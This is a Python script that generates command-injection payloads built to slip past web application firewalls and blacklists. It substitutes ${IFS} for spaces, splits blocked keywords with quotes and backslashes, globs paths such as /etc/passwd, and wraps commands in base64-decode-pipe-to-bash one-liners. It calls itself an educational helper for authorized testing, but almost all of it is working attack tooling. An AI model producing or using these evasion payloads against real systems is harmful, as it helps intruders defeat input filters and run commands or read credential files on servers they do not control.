#!/usr/bin/env python3
"""
evasion.py — build WAF/blacklist-evasion variants of a shell command
(COMMAND_INJECTION_TESTING_GUIDE.md §10). Educational helper for AUTHORIZED testing.

Given a command and which classes of characters/keywords are blocked, it prints working alternatives
using ${IFS} for spaces, quote/backslash splitting for keywords, base64-decode-pipe, and globbing.

Usage:
  python3 evasion.py --cmd "cat /etc/passwd"
  python3 evasion.py --cmd "cat /etc/passwd" --block "space,cat,slash"
"""
import argparse, base64

def split_keyword(word):
    # c''at , c\at , "c"at
    out = []
    if len(word) > 1:
        out.append(word[0] + "''" + word[1:])
        out.append(word[0] + "\\" + word[1:])
        out.append('"' + word[0] + '"' + word[1:])
        out.append(word[0] + '\\' + word[1] + word[2:] if len(word) > 2 else word)
    return list(dict.fromkeys(out))

def glob_path(path):
    # /etc/passwd -> /???/p?sswd  (rough)
    parts = path.strip("/").split("/")
    g = []
    for p in parts:
        if len(p) >= 3:
            g.append(p[0] + "?" * (len(p) - 2) + p[-1])
        else:
            g.append("?" * len(p))
    return "/" + "/".join(g)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cmd", required=True, help='e.g. "cat /etc/passwd"')
    ap.add_argument("--block", default="", help="comma list: space,<keyword>,slash,all")
    a = ap.parse_args()
    blocked = set(x.strip() for x in a.block.split(",") if x.strip())
    cmd = a.cmd
    tokens = cmd.split()
    keyword = tokens[0] if tokens else cmd

    print(f"# original: {cmd}\n")

    # space evasion
    if "space" in blocked or "all" in blocked or not blocked:
        print("## spaces blocked -> use ${IFS} / brace / redirect")
        print("   " + cmd.replace(" ", "${IFS}"))
        print("   " + cmd.replace(" ", "$IFS$9"))
        if len(tokens) >= 2:
            print("   " + "{" + ",".join(tokens) + "}")
            print("   " + tokens[0] + "<" + tokens[1] + "   (if reading a file)")
        print()

    # keyword evasion
    targets = [t for t in (blocked & set(tokens)) if t != "space"] or ([keyword] if not blocked else [])
    for kw in targets:
        if kw in ("space", "slash", "all"):
            continue
        print(f"## keyword '{kw}' blocked -> split it")
        for v in split_keyword(kw):
            print("   " + cmd.replace(kw, v, 1))
        print("   " + cmd.replace(kw, glob_path("/bin/" + kw).replace("/bin", "/???"), 1) + "   (glob in PATH)")
        print()

    # slash evasion
    if "slash" in blocked or "all" in blocked:
        print("## slash blocked -> ${HOME:0:1} or tr")
        print("   " + cmd.replace("/", "${HOME:0:1}"))
        print()

    # globbing
    if "/" in cmd:
        path = [t for t in tokens if t.startswith("/")]
        if path:
            print("## globbing the path (avoid literal filename)")
            print("   " + cmd.replace(path[0], glob_path(path[0]), 1))
            print()

    # base64 pipe (defeats most filters)
    b64 = base64.b64encode(cmd.encode()).decode()
    print("## heavy filter -> base64-decode-pipe (no literal command chars)")
    print(f"   echo {b64}|base64 -d|bash")
    print(f"   bash<<<$(base64 -d<<<{b64})")
    print()
    print("# Combine layers as needed. Prove execution with a benign marker, then clean up (§19).")

if __name__ == "__main__":
    main()
